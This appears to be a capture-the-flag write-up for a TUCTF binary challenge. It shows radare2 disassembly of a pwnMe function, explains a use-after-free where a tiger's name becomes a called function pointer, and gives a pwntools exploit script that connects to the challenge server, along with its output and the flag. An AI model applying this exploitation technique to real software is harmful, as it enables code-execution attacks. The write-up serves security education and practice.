### Solved by superkojiman

To be honest, this involved a bit of guesswork and reversing. I'll start with the reversing. 

If we set our choice to 0x1337 (4919), it goes into a special function called pwnme(). Here's what it looks like:

```
[0x00400820]> pdf@sym.pwnMe
/ (fcn) sym.pwnMe 67
|           ; var int local_8h     @ rbp-0x8
|           ; var int local_10h    @ rbp-0x10
|           ; CALL XREF from 0x00400e37 (sym.pwnMe)
|           0x00400ce1      55             push rbp
|           0x00400ce2      4889e5         mov rbp, rsp
|           0x00400ce5      4883ec10       sub rsp, 0x10
|           0x00400ce9      8b05d1132000   mov eax, dword [rip + 0x2013d1] ; [0x6020c0:4]=0x4700352e  LEA obj.bearOffset ; ".5" @ 0x6020c0
|           0x00400cef      4898           cdqe
|           0x00400cf1      488b04c5e020.  mov rax, qword [rax*8 + obj.pointers] ; [0x6020e0:8]=0x322e382e3420  LEA obj.pointers ; " 4.8.2" @ 0x6020e0
|           0x00400cf9      488945f0       mov qword [rbp - local_10h], rax
|           0x00400cfd      488b45f0       mov rax, qword [rbp - local_10h]
|           0x00400d01      8b4014         mov eax, dword [rax + 0x14] ; [0x14:4]=1
|           0x00400d04      83f803         cmp eax, 3
|       ,=< 0x00400d07      7511           jne 0x400d1a
|       |   0x00400d09      488b45f0       mov rax, qword [rbp - local_10h]
|       |   0x00400d0d      488b00         mov rax, qword [rax]
|       |   0x00400d10      488945f8       mov qword [rbp - local_8h], rax
|       |   0x00400d14      488b45f8       mov rax, qword [rbp - local_8h]
|       |   0x00400d18      ffd0           call rax
|       |   ; JMP XREF from 0x00400d07 (sym.pwnMe)
|       `-> 0x00400d1a      bf00000000     mov edi, 0
\           0x00400d1f      e8ecfaffff     call sym.imp.exit
```

At 0x00400d04, it checks if the value in eax is 3. I'm not sure what this value is, but after some trial and error, I found  that I could set it to 3 when I created two tigers of type 3 and 4.

At 0x00400d18, it calls rax. The value in rax is the name of the first tiger. So all I had to here was name the first tiger an address I wanted to set EIP to. In this case, that value is the address of the function 1337Hax0r(). This function returns the flag. 

And so here's the exploit:

```
#!/usr/bin/env python
from pwn import *

get_flag = p64(0x40090D)

r = remote("104.155.227.252", 25050)

r.recvuntil("choice:")
r.sendline("2")
r.recvuntil("Caspian Tiger")
r.sendline("3")
r.recvuntil(":")
r.sendline(get_flag)

r.recvuntil("choice:")
r.sendline("2")
r.recvuntil("Caspian Tiger")
r.sendline("4")
r.recvuntil(":")
r.sendline("bbbbbb")


r.recvuntil("choice:")
r.sendline("4919")

print r.recvall()
```

Scoring the flag:

```
# ./sploit.py
[+] Opening connection to 104.155.227.252 on port 25050: Done
[+] Recieving all data: Done (50B)
[*] Closed connection to 104.155.227.252 port 25050

TUCTF{free_as_in_freedom_I_mean_Use_after_free}
```
